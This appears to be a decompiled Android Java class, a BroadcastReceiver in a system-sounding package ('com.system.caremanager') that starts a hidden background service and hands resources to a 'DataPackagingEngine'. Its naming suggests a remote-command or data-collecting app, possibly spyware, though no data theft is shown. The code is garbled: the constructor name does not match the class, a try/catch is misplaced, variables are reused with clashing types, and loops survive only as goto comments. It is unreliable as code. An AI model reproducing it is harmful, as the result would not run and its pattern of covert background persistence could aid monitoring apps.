package com.system.caremanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class CommandHandler extends BroadcastReceiver {

    public RemoteCommandHandler() {
        return;
    }

    public void onReceive(Context param1, Intent param2) {
        try {
            Resources result = param1.getResources();
            int val = 2131296274;
            String result2 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            Context appContext = MainBackgroundService.appContext;
            if (appContext != null) {
                // branch: cond_0
            }
            MainBackgroundService.appContext = param1;
            Class cls = MainBackgroundService.class;
            boolean result3 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, param1);
            if (result == null) {
                // branch: cond_4
            }
            Resources result4 = param1.getResources();
            String result5 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            ComponentName result6 = param1.startService(intent);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result7 = Boolean.valueOf(1);
            boolean result8 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            Boolean result9 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result10 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result11 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result12 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result13 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result14 = result.booleanValue();
            if (result == null) {
                // branch: cond_4
            }
            Boolean result15 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}